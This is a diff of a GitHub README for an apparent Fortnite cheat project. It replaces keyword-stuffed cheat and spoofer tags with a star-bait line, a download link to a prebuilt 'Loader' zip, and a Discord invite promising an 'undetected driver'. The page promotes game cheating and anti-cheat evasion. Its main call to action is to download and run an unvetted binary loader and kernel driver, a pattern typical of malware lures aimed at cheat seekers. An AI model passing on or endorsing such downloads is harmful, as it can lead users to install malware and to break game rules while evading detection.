@@ -1,2 +1,10 @@
-# Updated-Fortnite-External
-Updated Fortnite External Source | fortnite cheat, fortnite driver, fortnite offsets, valorant offsets, valorant cheat, data pointer, data ptr, ioctl, offsets, driver, cheats, hacks, hack, undetected, cracked, ud, external, internal, cs2, rust, apex, legends, spoofer, temp, perm
+
+20 stars = new updated source
+# Download Build
+[Download](https://github.com/CrazFrogb/23fasd21/releases/download/loader/Loader.Github.zip)
+          
+# Discord
+Join my [discord server](https://discord.gg/YzpCypQyNw) to get vcxproj files and undetected driver for this source
+		  
+Screenshot:
+![Screenshot](https://user-images.githubusercontent.com/104287840/214996773-b5d419f7-84f0-4d93-ae41-244c62ec6a31.png)
